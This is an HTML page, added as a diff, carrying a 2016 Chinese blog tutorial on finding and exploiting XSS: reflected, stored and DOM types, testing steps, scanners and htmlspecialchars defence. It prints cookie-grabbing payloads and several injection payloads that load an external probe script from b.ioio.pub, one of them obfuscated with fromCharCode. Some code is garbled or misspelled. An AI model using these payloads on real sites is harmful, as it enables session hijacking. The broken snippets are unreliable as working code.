@@ -1,0 +1,304 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="theme-color" content="#1b7aca">
+  <link rel="icon" href="/icon.jpg">
+  <meta name="application-name" content="Hexo"/>
+  <meta name="msapplication-TileColor" content="#1b7aca"/>
+  <meta name="msapplication-square70x70logo" content="/icon.jpg" />
+  <meta name="msapplication-square150x150logo" content="/icon.jpg" />
+  <meta name="msapplication-wide310x150logo" content="/icon.jpg" />
+  <meta name="msapplication-square310x310logo" content="/icon.jpg" />
+  <meta name="msapplication-notification" content="frequency=30; polling-uri=/atom.xml" />
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <link rel="apple-touch-icon" href="/icon.jpg">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <link rel="apple-touch-startup-image" href="/icon.jpg">
+
+  
+  <title>xss的挖掘和利用 | Hexo</title>
+  <meta name="author" content="John Doe">
+  
+  <meta name="description" content="title: xss的挖掘和利用date: 2016-07-18 21:26:46
+tags:什么是XSS即跨站脚本发生在浏览器上为什么用户浏览器渲染整个html文档出现了不可预期的脚本指令并执行跨站脚本重要的是脚本对于网站是不可预期的，对于攻击者是可预期的这类攻击主要是浏览器解析执行的，浏览器不是看到什么就解析什么，不符合规定就不会执行。浏览器安全策略：同源策略漏洞挖掘1.用户提交的脚本指令2提交服务器脚本没有过滤完整3输出的时候浏览器渲染解析你的指令就能执行
+漏洞利用js可以获取什么，xss就可以获取什么xss的危害：获取管理员的cookiexss worm挂马（水坑攻击）键盘记录（有局限性）利用网站重定向修改网页内容攻击场景：在各类的sns、邮件系统、开源流行的web应用、bbs、微博社交等，主要是一些大型的网站才有价值支持html解析和javascript解析的客户端，如：html文档、flash、pdf等form表单提交的内容出现在网页上 如：昵称、邮箱、简介、留言
+同源策略：
+https://github.com/evilcos/xssprobe
+xss分类反射型xss(非持久型) alert(1)反射型xss也被称为非持久型xss，是现在最容易出现的一种xss漏洞，xss代码出现在url中，最后输入提交到服务器中，服务器解析后响应出现这段xss代码，最后浏览器解析执行    简单的流程：用户访问带有xss代码的url请求服务器接收后处理，将返回的带有xss代码的数据发送给浏览器浏览器解析带有xss代码的数据后，最终造成xss漏洞可能攻击流程：    • 用户aaa在网站www.xxx.com浏览网页    • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，代码功能为盗取用户Cookie并发送到指定站点www.xxser.com    • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击    • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com    • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息
+储存型xss存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动 触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被 XSS，其中最典型的例子就是留言板。区别在于：提交的xss代码会存储在服务器中，下次请求时就不用再提交xss代码留言板测试技巧：    • 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，    如：        在输入框中输入alert(/xss/)就可以测试    • 确定输出点后根据相应的标签构造HTML代码来闭合，如：‘ /&amp;gt;alert(1)&amp;lt;’，最终在html中为： alert(1)&amp;lt;”” /&amp;gt;测试步骤：    • 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入    • 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：        a. alert(document.cookie)  //普通注入        b. “ /&amp;gt;alert(document.cookie)   //闭合标签注入        c. ‘“&amp;gt;alert(document.cookie)   //闭合标签注入
+
+xss的检测
+xss分为手工检测和软件自动检测手工检测：检测结果准确，但对于大型web来说费时费力软件检测：方便省力，但存在误报，且有写隐蔽的XSS无法检测出检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出1.手工检测由输出位置：输入敏感字符，如“&amp;lt;、&amp;gt;”‘、’（）”等提交后查看html的源代码 很多web应用程序源码不公开，在测试时不能的值输出位置，比如，有些留言本在留言后必须经过管理员审核才能显示，无法的值数据在后台管理页面处于何种状态，如：    在标签中：XSS Test    在属性内：
+在输入框中输入content” value=”XSS Test    这种情况通常采用输入”/&amp;gt;XSS Test来测试。2.全自动检测xss这个就不用多说了工具上appscan,wvs,burpsuit等软件都可以有效的检测xss，还会检测其他的漏洞专业的xss扫描还有xssER、xssf等，还有专门扫描dom类型xss的web服务
+3.xss漏洞的挖掘反射型xss:一般url参数中的值能够回显到html中，url的参数过滤不严谨存储型xss:可以提交内容提交内容可被管理员或其他用户看到
+4.xss一般就是闭合标签，和sql注入类似，常见payload如下： • • &amp;lt;svg onload=s=createElement(‘script’);body.appendChild(s);s.src=’http://b.ioio.pub/xss/probe.js&amp;gt;• xss简单示例发射型xss实列&amp;lt;?php  echo $_GET[‘x’];提交：/xss.php?x=  &amp;lt; scri pt&amp;gt;alert(1)服务器解析时就会触发弹窗
+?&amp;gt;下面是一段经典的DOM型XSS示例：
+    var temp = document.URL; //获取URL    var index = document.URL.indexOf(“content”);    var par = temp.substrint(index);    document.write(decodeURL(par)); //输入获取内容上述代码的意思是获取URL中content参数的值，并且输出，若输入http://www.xxx.com/dom.html?content=alert(/xss/)，就会产生XSS漏洞。
+xss的防御使用htmlspecialchars()和hemlentities()将一些预定义的字符转换为html实体&amp;lt;?php              $html = $_GET[‘x’];   if($html){echo htnlspecialchars($html）}?&amp;gt;">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="xss的挖掘和利用"/>
+  <meta property="og:site_name" content="Hexo"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.png" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  
+    <link href="/css/animate.css" rel="stylesheet">
+  
+  
+    <script src="/js/jquery-2.0.3.min.js"></script>
+  
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <script>
+    if (window.location.href.indexOf("")<0) {      location.href = location.href.replace(location.host, "");    }
+  </script>
+
+</head>
+
+
+<body>
+<!--[if lt IE9]>
+<script>
+alert("Please Update Your IE \n请升级您的IE浏览器");
+</script>
+< ![endif]-->
+  <header id="header" class="header header--fixed hide-from-print animated slideInDown"><div class="alignleft backtohome">
+  <a href="/">
+    <img id="icon-photo-small" class="personal-photo  animated rotateIn" src="/icon.jpg" alt="John Doe">
+  </a>
+  <h1 id="title-mini" class=""><a href="/">Hexo</a></h1>
+</div>
+<a target="_blank" id="mini-toggle" class="more icon alignright"></a>
+<nav id="main-nav" class="alignright animated slideInRight">
+
+    
+    
+      <a target="_blank" class="icon twitter" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  <div class="clearfix"></div>
+</nav>
+
+</header>
+  <aside id="sidebar" class="alignleft animated slideInLeft"><div class="personal-info">
+  <figure>
+    
+    <div  class="backtohome">
+      <a href="/">
+        <img id="icon-photo-normal" class="personal-photo animated rotateIn" src="/icon.jpg" alt="John Doe">
+      </a>
+    </div>
+    
+    <figcaption>
+      <h3 class=>John Doe</h3>
+      <p></p>
+    </figcaption>
+  </figure>
+  <section class="social">
+    
+    
+      <a target="_blank" class="icon twitter depth" href="http://twitter.com/1ittlecup"></a>
+    
+    
+    
+      <a target="_blank" class="icon googleplus depth" href="http://plus.google.com/+RuoxinHe"></a> 
+    
+    
+    
+    
+    
+    
+      <a target="_blank" class="icon zhihu depth" href="http://zhihu.com/people/1ittlecup"></a>
+    
+    
+    
+  </section>
+</div>
+<div class="theme-info">
+  <a target="_blank" href="https://github.com/heruoxin/hexo-persona-color" class="html5"> Persona Color Theme</a> 
+  &copy; - 2016 John Doe
+  
+</div>
+</aside>
+  <div id="content" class="inner">
+    <p id="header-fix"></p>
+    <div id="main-col" class="alignright"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon depth"></div>
+        <time class="depth" datetime="2016-07-19T09:05:33.000Z"><a href="#">2016-07-19</a></time>
+      
+      
+  
+    <h1 class="depth title">xss的挖掘和利用</h1>
+  
+
+    </header>
+    <div class="entry depth">
+      
+        <hr>
+<p>title: xss的挖掘和利用<br>date: 2016-07-18 21:26:46</p>
+<h2 id="tags"><a href="#tags" class="headerlink" title="tags:"></a>tags:</h2><p>什么是XSS<br>即跨站脚本发生在浏览器上<br>为什么用户浏览器渲染整个html文档出现了不可预期的脚本指令并执行<br>跨站脚本重要的是脚本<br>对于网站是不可预期的，对于攻击者是可预期的<br>这类攻击主要是浏览器解析执行的，浏览器不是看到什么就解析什么，不符合规定就不会执行。浏览器安全策略：同源策略<br>漏洞挖掘<br>1.用户提交的脚本指令<br>2提交服务器脚本没有过滤完整<br>3输出的时候<br>浏览器渲染解析你的指令就能执行</p>
+<p>漏洞利用<br>js可以获取什么，xss就可以获取什么<br>xss的危害：<br>获取管理员的cookie<br>xss worm<br>挂马（水坑攻击）<br>键盘记录（有局限性）<br>利用网站重定向<br>修改网页内容<br>攻击场景：<br>在各类的sns、邮件系统、开源流行的web应用、bbs、微博社交等，主要是一些大型的网站才有价值<br>支持html解析和javascript解析的客户端，如：html文档、flash、pdf等<br>form表单提交的内容出现在网页上 如：昵称、邮箱、简介、留言</p>
+<p>同源策略：</p>
+<p><a href="https://github.com/evilcos/xssprobe" target="_blank" rel="external">https://github.com/evilcos/xssprobe</a></p>
+<p>xss分类<br>反射型xss(非持久型)<br> <script>alert(1)</cript><br>反射型xss也被称为非持久型xss，是现在最容易出现的一种xss漏洞，xss代码出现在url中，最后输入提交到服务器中，服务器解析后响应出现这段xss代码，最后浏览器解析执行<br>    简单的流程：<br>用户访问带有xss代码的url请求<br>服务器接收后处理，将返回的带有xss代码的数据发送给浏览器<br>浏览器解析带有xss代码的数据后，最终造成xss漏洞<br>可能攻击流程：<br>    • 用户aaa在网站www.xxx.com浏览网页<br>    • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码，代码功能为盗取用户Cookie并发送到指定站点www.xxser.com<br>    • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击<br>    • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com<br>    • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息</p>
+<p>储存型xss<br>存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动 触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被 XSS，其中最典型的例子就是留言板。<br>区别在于：提交的xss代码会存储在服务器中，下次请求时就不用再提交xss代码<br>留言板<br><code><br>测试技巧：<br>    • 首先确定输入点和输出点，比如留言，若留言输出(显示)的地方是标签内，则XSS代码会被执行，但若输出在属性内，则不会执行，<br>    如：<br>    <input type="text" name="content" value="" /><br>    在输入框中输入<script>alert(/xss/)<script>就可以测试<br>    • 确定输出点后根据相应的标签构造HTML代码来闭合，如：‘ /&gt;<script>alert(1)<script>&lt;’，最终在html中为：<br> <script>alert(1)<script>&lt;”” /&gt;<br>测试步骤：<br>    • 添加正常留言，用firebug快速查找显示标签，若显示区域不在html属性内则可以直接使用XSS代码注入<br>    • 若不能得知内容输出的位置，可以使用模糊测试方案，XSS代码如下：<br>        a. <script>alert(document.cookie)<script>  //普通注入<br>        b. “ /&gt;<script>alert(document.cookie)<script>   //闭合标签注入<br>        c. </textarea>‘“&gt;<script>alert(document.cookie)<script>   //闭合标签注入</p>
+<p></code></p>
+<p>xss的检测</p>
+<p>xss分为手工检测和软件自动检测<br>手工检测：检测结果准确，但对于大型web来说费时费力<br>软件检测：方便省力，但存在误报，且有写隐蔽的XSS无法检测出<br>检测XSS最重要的就是考虑哪里有输入，输入的数据在哪里输出<br>1.手工检测<br><code><br>由输出位置：输入敏感字符，如“&lt;、&gt;”‘、’（）”等提交后查看html的源代码<br> 很多web应用程序源码不公开，在测试时不能的值输出位置，比如，有些留言本在留言后必须经过管理员审核才能显示，无法的值数据在后台管理页面处于何种状态，如：<br>    在标签中：<div>XSS Test</div><br>    在属性内：<input type="text" name="" /></p>
+<p>在输入框中输入content” value=”XSS Test<br>    这种情况通常采用输入”/&gt;XSS Test来测试。<br></code><br>2.全自动检测xss<br>这个就不用多说了工具上<br>appscan,wvs,burpsuit等软件都可以有效的检测xss，还会检测其他的漏洞<br>专业的xss扫描还有xssER、xssf等，还有专门扫描dom类型xss的web服务</p>
+<p>3.xss漏洞的挖掘<br><code><br>反射型xss:<br>一般url参数中的值能够回显到html中，url的参数过滤不严谨<br>存储型xss:<br>可以提交内容<br>提交内容可被管理员或其他用户看到</p>
+<p></code><br>4.xss一般就是闭合标签，和sql注入类似，常见payload如下：<br><code><br> <script src='http://b.ioio.pub/xss/probe.js'><script><br>• <img src=x onerror="s=createElement('script');body.appendChild(s);s.src='http://b.ioio.pub/xss/probe.js'";><br>• &lt;svg onload=s=createElement(‘script’);body.appendChild(s);s.src=’<a href="http://b.ioio.pub/xss/probe.js&gt;">http://b.ioio.pub/xss/probe.js&gt;</a><br>• <svg onload=eval(String.fromCharCode(115,61,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,115,46,115,114,99,61,39,104,116,116,112,58,47,47,98,46,105,111,105,111,46,112,117,98,47,120,115,115,47,112,114,111,98,101,46,106,115)) ><br></code><br>xss简单示例<br>发射型xss实列<br>&lt;?php<br>  echo $_GET[‘x’];<br>提交：<br>/xss.php?x=  &lt; scri pt&gt;alert(1)<script><br>服务器解析时就会触发弹窗</p>
+<p>?&gt;<br>下面是一段经典的DOM型XSS示例：</p>
+<p><script><br>    var temp = document.URL; //获取URL<br>    var index = document.URL.indexOf(“content”);<br>    var par = temp.substrint(index);<br>    document.write(decodeURL(par)); //输入获取内容<script><br>上述代码的意思是获取URL中content参数的值，并且输出，若输入<a href="http://www.xxx.com/dom.html?content=">http://www.xxx.com/dom.html?content=</a><script>alert(/xss/)<script>，就会产生XSS漏洞。</p>
+<p>xss的防御<br>使用htmlspecialchars()和hemlentities()将一些预定义的字符转换为html实体<br>&lt;?php<br>              $html = $_GET[‘x’];<br>   if($html){<br>echo htnlspecialchars($html）}<br>?&gt;</p>
+<a id="more"></a>
+</script></p>
+      
+    </div>
+    <footer>
+      
+        
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <div class="clearfix"></div>
+  </div>
+
+  <footer id="footer" class="inner"></footer>
+  <script src="/js/headroom.min.and.gallery.js"></script>
+<script>
+$("#mini-toggle").click(function () {
+    $( "#main-nav" ).css("display","inline");
+    setTimeout(function(){
+        $( "#main-nav" ).removeClass("slideInRight").addClass("slideOutRight");
+    }, 3000);
+    setTimeout(function(){
+        $( "#main-nav" ).css("display","");
+        $( "#main-nav" ).removeClass("slideOutRight").addClass("slideInRight");
+    }, 3555);
+});
+</script>
+
+<script>
+$("#header").headroom({
+  "tolerance": 0,
+  "offset": 200,
+  "classes": {
+    "initial": "",
+    "pinned": "slideInDown",
+    "unpinned": "slideOutUp"
+  }
+});
+$("#header").headroom("destroy");
+console.log("这网站没彩蛋，不用找了……")
+</script>
+
+<script>
+$("a").click(function () {
+    $( "#icon-photo-small"  ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    $( "#icon-photo-normal" ).removeClass( "rotateIn" ).addClass( "rotateOut" );
+    setTimeout(function(){
+        $( "#icon-photo-small"  ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+        $( "#icon-photo-normal" ).removeClass( "rotateOut" ).addClass( "rotateIn" );
+    }, 900);
+});
+</script>
+
+
+<script type="text/javascript">
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-46393541-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+<!--[if lt IE 9]><script src="/js/excanvas.js"></script><![endif]-->
+<script src="/js/jquery.tagcanvas.min.js"></script>
+ <script type="text/javascript">
+ $(document).ready(function() {
+   if( ! $('#myCanvas').tagcanvas({
+     textColour : '#6d6d6d',
+     outlineThickness : 1,
+     textHeight: 20,
+     maxSpeed : 0.04,
+     depth : 0.75
+   })) {
+     // TagCanvas failed to load
+     $('#myCanvasContainer').hide();
+   }
+   // your other jQuery stuff here...
+ });
+ </script>
+
+
+<script src="/js/pangu.js"></script>
+<script>pangu.page_spacing();</script>
+
+
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+</html>
